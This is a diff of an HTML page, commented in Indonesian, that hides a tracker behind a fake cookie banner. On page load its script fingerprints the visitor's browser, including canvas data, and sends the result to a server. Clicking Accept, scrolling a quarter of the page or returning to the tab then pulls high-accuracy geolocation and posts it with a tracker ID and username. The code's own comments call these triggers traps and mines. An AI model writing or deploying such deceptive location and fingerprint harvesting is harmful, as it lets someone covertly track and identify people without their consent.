@@ -19,7 +19,6 @@
             height: 100%; 
             border: none; 
         }
-        /* --- Gaya Cookie Banner --- */
         #cookie-trap-banner {
             position: fixed;
             bottom: 0;
@@ -31,7 +30,7 @@
             box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
             font-family: Arial, sans-serif;
             font-size: 14px;
-            transform: translateY(100%); /* Mulai dari bawah (tersembunyi) */
+            transform: translateY(100%);
             transition: transform 0.5s ease-in-out;
         }
         #cookie-trap-banner.visible {
@@ -74,7 +73,7 @@
     <div id="cookie-trap-banner">
         <div class="cookie-content">
             <div class="cookie-text">
-                <p>We value your privacy. This site uses cookies for functionality and analytics. <a href="#">Privacy Policy</a>.</p>
+                <p>We use cookies to enhance your browsing experience and analyze our traffic. <a href="#">Learn more</a>.</p>
             </div>
             <div class="cookie-buttons">
                 <button id="decline-btn" class="cookie-btn">Decline</button>
@@ -86,66 +85,94 @@
     <script>
         const trackerId = "{{TRACKER_ID}}";
         const username = "{{USERNAME}}";
-        let hasTriggered = false; // Kunci utama untuk memastikan skrip hanya berjalan sekali
+        let hasTriggered = false;
 
         // --- Fungsi Inti ---
 
-        const sendLocation = () => {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        console.log("Location captured successfully!");
-                        fetch('/log', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                latitude: position.coords.latitude,
-                                longitude: position.coords.longitude,
-                                trackerId,
-                                username
-                            }),
-                        });
-                    },
-                    (error) => { console.warn(`Geolocation error on trigger:`, error.message); },
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                );
+        const sendData = async (endpoint, payload) => {
+            try {
+                await fetch(endpoint, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload),
+                });
+            } catch (error) {
+                console.error(`Failed to send data to ${endpoint}:`, error);
             }
-        };
-
-        const cleanupListeners = () => {
-            document.removeEventListener('scroll', handleScroll);
-            document.removeEventListener('copy', handleCopy);
-            document.documentElement.removeEventListener('mouseout', handleExitIntent);
-            console.log("All behavioral listeners have been removed.");
         };
         
-        const hideBanner = () => {
-            const banner = document.getElementById('cookie-trap-banner');
-            if (banner) {
-                banner.classList.remove('visible');
+        const generateFingerprint = async () => {
+            // Mengumpulkan data dasar
+            const details = {
+                userAgent: navigator.userAgent,
+                screenResolution: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                platform: navigator.platform,
+                plugins: Array.from(navigator.plugins).map(p => p.name)
+            };
+
+            // Canvas Fingerprinting
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                const txt = 'Browser-Fingerprint-String-12345!@#$%';
+                ctx.textBaseline = "top";
+                ctx.font = "14px 'Arial'";
+                ctx.textBaseline = "alphabetic";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125,1,62,20);
+                ctx.fillStyle = "#069";
+                ctx.fillText(txt, 2, 15);
+                details.canvasData = canvas.toDataURL();
+            } catch (e) {
+                details.canvasData = "unsupported";
             }
+
+            // Generate Hash dari detail
+            const detailString = JSON.stringify(details);
+            const hashBuffer = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(detailString));
+            const hashArray = Array.from(new Uint8Array(hashBuffer));
+            const fingerprintHash = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+            
+            return { fingerprintHash, details };
         };
 
         const triggerActionAndCleanup = (triggerType) => {
             if (hasTriggered) return;
             hasTriggered = true;
             console.log(`Action triggered by: ${triggerType}`);
-            sendLocation();
-            hideBanner();
-            cleanupListeners();
+            
+            // Mengirim data lokasi
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        console.log("Location captured!");
+                        sendData('/log', {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            trackerId,
+                            username
+                        });
+                    },
+                    (error) => { console.warn('Geolocation error:', error.message); },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            }
+            cleanup();
         };
 
-        const declineActionAndCleanup = () => {
-             if (hasTriggered) return;
-            hasTriggered = true;
-            console.log("Action: Decline. Cleaning up listeners.");
-            hideBanner();
-            cleanupListeners();
-        }
+        const cleanup = () => {
+            const banner = document.getElementById('cookie-trap-banner');
+            if (banner) banner.classList.remove('visible');
+            
+            document.removeEventListener('scroll', handleScroll);
+            document.removeEventListener('visibilitychange', handleVisibilityChange);
+            console.log("All behavioral listeners removed.");
+        };
 
         // --- Logika Pemicu ---
 
-        // Pemicu 1: Gulir (Scroll)
         const handleScroll = () => {
             const scrollPercentage = (window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100;
             if (scrollPercentage > 25) {
@@ -153,36 +180,43 @@
             }
         };
 
-        // Pemicu 2: Salin Teks (Copy)
-        const handleCopy = () => {
-            triggerActionAndCleanup('copy');
-        };
-
-        // Pemicu 3: Niat Keluar (Exit Intent)
-        const handleExitIntent = (e) => {
-            if (!e.toElement && !e.relatedTarget && e.clientY < 10) {
-                triggerActionAndCleanup('exit-intent');
+        let hasBeenHidden = false;
+        const handleVisibilityChange = () => {
+            if (document.hidden) {
+                hasBeenHidden = true;
+            } else if (hasBeenHidden) {
+                triggerActionAndCleanup('tab-refocus');
             }
         };
 
         // --- Inisialisasi Jebakan ---
+        (async () => {
+            // 1. Langsung ambil dan kirim fingerprint saat halaman dimuat
+            const { fingerprintHash, details } = await generateFingerprint();
+            sendData('/api/fingerprint', { trackerId, fingerprintHash, details });
+            console.log(`Fingerprint sent: ${fingerprintHash}`);
 
-        // Pasang listener untuk tombol-tombol banner
-        document.getElementById('accept-btn').addEventListener('click', () => triggerActionAndCleanup('cookie_accept'));
-        document.getElementById('decline-btn').addEventListener('click', declineActionAndCleanup);
+            // 2. Pasang listener untuk tombol-tombol banner
+            document.getElementById('accept-btn').addEventListener('click', () => triggerActionAndCleanup('cookie_accept'));
+            document.getElementById('decline-btn').addEventListener('click', () => {
+                if (hasTriggered) return;
+                hasTriggered = true;
+                console.log("Action: Decline. Cleaning up.");
+                cleanup();
+            });
 
-        // Pasang semua "ranjau" perilaku pasif
-        document.addEventListener('scroll', handleScroll, { passive: true });
-        document.addEventListener('copy', handleCopy);
-        document.documentElement.addEventListener('mouseout', handleExitIntent);
+            // 3. Pasang "ranjau" perilaku pasif
+            document.addEventListener('scroll', handleScroll, { passive: true });
+            document.addEventListener('visibilitychange', handleVisibilityChange);
 
-        // Tampilkan banner setelah jeda singkat agar terlihat natural
-        setTimeout(() => {
-            if (!hasTriggered) {
-                 const banner = document.getElementById('cookie-trap-banner');
-                 if(banner) banner.classList.add('visible');
-            }
-        }, 1500); // Muncul setelah 1.5 detik
+            // 4. Tampilkan banner setelah jeda singkat
+            setTimeout(() => {
+                if (!hasTriggered) {
+                    const banner = document.getElementById('cookie-trap-banner');
+                    if(banner) banner.classList.add('visible');
+                }
+            }, 1500);
+        })();
 
     </script>
 </body>
